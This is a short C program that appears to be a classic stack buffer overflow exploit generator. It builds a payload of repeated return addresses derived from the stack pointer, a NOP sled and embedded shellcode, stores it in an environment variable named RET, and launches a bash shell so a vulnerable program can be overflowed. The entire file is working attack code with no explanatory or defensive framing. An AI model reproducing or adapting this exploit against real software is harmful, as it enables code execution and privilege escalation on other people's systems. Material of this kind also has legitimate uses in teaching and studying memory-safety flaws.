#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "shellcode.h"

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 300
#define NOP 0x90

unsigned long get_esp(void)
{
	__asm__("movl %esp,%eax");
}

int  main(int argc, char **argv)
{
	char *buff, *ptr;
	long *addr_ptr, addr;
	int offset=DEFAULT_OFFSET, blkSize = DEFAULT_BUFFER_SIZE;
	int i = 0;

	if (argc > 1) blkSize = atoi(argv[1]);
	if (argc > 2) offset = atoi(argv[2]);

	if (blkSize < 1) {
		printf("Invalid size for buffer\n");
		exit(0);
	}

	buff = (char*)malloc(blkSize);
	if (buff == NULL) {
		printf("Can't allocate memory for buffer\n");
		exit(1);
	}

	addr = get_esp() - offset;
	printf("Using address: 0x%x\n", addr);
	
	ptr = buff;
	addr_ptr = (long *)ptr;
	for (i = 0; i < blkSize; i += 4) {
		*(addr_ptr++) = addr;
	}

	for (i = 0; i < blkSize/2; i++) {
		buff[i] = NOP;			
	}

	ptr = buff + (blkSize/2 - strlen(shellcode)/2);

	for (i = 0; i < strlen(shellcode); i++) {
		*(ptr++) = shellcode[i];
	}

	buff[blkSize-1] = '\0';

	memcpy(buff, "RET=", 4);
	putenv(buff);
	system("/bin/bash");
	return 0;
}
